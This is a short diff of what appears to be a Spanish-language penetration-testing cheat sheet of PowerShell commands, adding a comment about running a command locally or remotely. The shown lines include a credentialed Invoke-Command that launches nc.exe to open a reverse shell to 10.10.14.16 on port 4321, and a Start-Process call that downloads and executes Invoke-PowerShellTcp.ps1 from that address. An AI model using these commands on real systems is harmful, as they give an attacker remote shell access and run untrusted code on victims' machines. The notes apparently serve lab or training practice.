@@ -133,6 +133,7 @@ hostname
 $env:COMPUTERNAME
 [Environment]::MachineName
 
+# Con o sin ComputerName en el caso de que sea local
 Invoke-Command -ComputerName Fidelity -Credential $credObject -ScriptBlock {C:\Windows\Temp\nc.exe -e cmd.exe 10.10.14.16 4321}
 
 Start-Process -FilePath 'powershell' -argumentlist "IEX(New-Object Net.webClient).downloadString('http://10.10.14.16/Invoke-PowerShellTcp.ps1')" -Credential $credObject
